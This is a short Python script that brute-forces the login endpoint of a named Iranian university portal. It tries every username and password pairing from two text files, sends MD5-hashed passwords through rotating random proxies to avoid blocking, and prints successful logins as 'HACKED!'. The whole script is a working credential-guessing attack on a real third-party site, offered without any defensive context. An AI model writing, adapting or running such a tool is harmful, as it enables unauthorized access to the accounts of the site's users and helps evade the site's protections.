# Modules

import requests, hashlib
from proxy_list import ProxyList


# Read Files

usernames_file = list(set([every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]))
passwords_file = list(set([every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]))


# Convert Passwords to MD5

def convert_to_md5(password):

    return hashlib.md5(password.encode('UTF-8')).hexdigest()


# Correspond Usernames and Passwords

def correspond_data(username, password):

    proxy_list = ProxyList()

    data = dict(UserPassword=convert_to_md5(password), pswdStatus='mediocre', UserID=username, DummyVar='')

    while True:
        try:
            request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxy_list.get_random_proxy())

            if request.status_code == 200 and 'راهنما' in request.text:
                print('True: ' + username + ' - ' + password + ' ━━━━━━━━━━ HACKED!')
            else:
                print('False: ' + username + ' - ' + password)

            return False


        except:
            print('Proxy Error: ' + username + ' - ' + password)


# Run Requests

def run_requests():
    print("Wait...")

    for checking_username in usernames_file:
        for checking_password in passwords_file:
            correspond_data(checking_username, checking_password)


run_requests()